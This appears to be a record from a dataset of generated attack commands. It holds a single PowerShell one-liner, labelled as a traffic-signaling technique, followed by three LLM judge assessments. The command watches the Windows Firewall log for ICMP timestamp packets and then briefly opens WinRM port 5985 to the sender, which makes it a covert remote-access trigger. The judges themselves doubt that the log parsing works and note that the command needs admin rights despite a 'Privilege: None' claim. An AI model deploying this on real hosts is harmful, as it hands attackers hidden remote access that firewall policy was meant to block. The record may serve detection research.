command: Invoke-Command -ComputerName localhost -ScriptBlock { $log = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'ALLOW\s+ICMP\s+(\d{1,3}(?:\.\d{1,3}){3})\s+(\d{1,3}(?:\.\d{1,3}){3}).*?\bicmp-type\s+13\b') { $src=$matches[1]; $name="winrm-icmp13-$($src.Replace('.','-'))"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }
explanation: Uses an ICMP Timestamp (type 13) echo as a covert signal to temporarily allow WinRM (5985) from the sender’s IP.
rationale_steps: Watch for ALLOW ICMP entries with icmp-type 13
On detection, add a scoped allow rule for TCP/5985 to the source IP

llm_judgments.syntactic_justification: PowerShell command is well-formed with balanced braces/quotes and valid cmdlets/parameters.
llm_judgments.semantic_justification: Concept aligns with Traffic Signaling to trigger a temporary WinRM rule via ICMP, but it likely fails due to incorrect Windows Firewall log parsing (expects literal 'icmp-type 13' in entries), dependence on admin rights/WinRM for Invoke-Command, and possible missing log file.

llm_judgments.syntactic_justification: The command is largely well-formed with balanced braces, quotes, and valid PowerShell constructs, though the escaped backslashes in the regex pattern (\s+, \b, \d) and path separators may behave differently depending on how the outer quoting interacts with the ScriptBlock string interpolation, creating minor edge-case parsing concerns.
llm_judgments.semantic_justification: The command correctly implements a traffic signaling technique by monitoring Windows Firewall logs for ICMP type 13 (Timestamp Request) packets and dynamically creating a temporary WinRM firewall rule for the source IP, which aligns well with T1205; however, the 'Privilege: None' claim is inaccurate since Set-NetFirewallProfile and New-NetFirewallRule require administrative privileges, and relying on the Windows Firewall log to detect ICMP type 13 is plausible but depends on the log format actually capturing icmp-type fields in a parseable way.

llm_judgments.syntactic_justification: The command is a well-formed PowerShell script with balanced braces, proper cmdlet usage, correctly escaped regex, and valid pipeline structures.
llm_judgments.semantic_justification: The command effectively implements traffic signaling by monitoring firewall logs for a specific ICMP type to trigger a rule change, though it requires Administrative privileges which are not noted in the description.
